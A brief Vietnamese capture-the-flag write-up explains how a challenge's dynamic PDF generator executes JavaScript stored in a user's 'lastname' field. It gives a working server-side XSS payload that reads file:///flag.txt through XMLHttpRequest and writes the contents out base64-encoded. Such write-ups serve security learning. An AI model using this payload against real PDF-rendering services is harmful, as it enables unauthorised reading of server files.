# XSS - Server Side

## Solution

Để solve challenge, cần tận dụng một điều mà các DEV không kiểm tra là dynamic PDF sau khi tạo tài khoản với `lastname` có chứa mã javascript như thế này

```
<script>
   x=new XMLHttpRequest; x.onload=function(){document.write(btoa(this.responseText))};
   x.open("GET","file:///flag.txt");x.send();
</script>
```

và sau đó click vào generate code sẽ nghĩ rằng thẻ script chỉ là html và nó sẽ chạy mã js và lấy tệp `flag.txt`

Đầu ra nhận được sẽ được mã hóa ở dạng base64 để giải mã và lấy flag
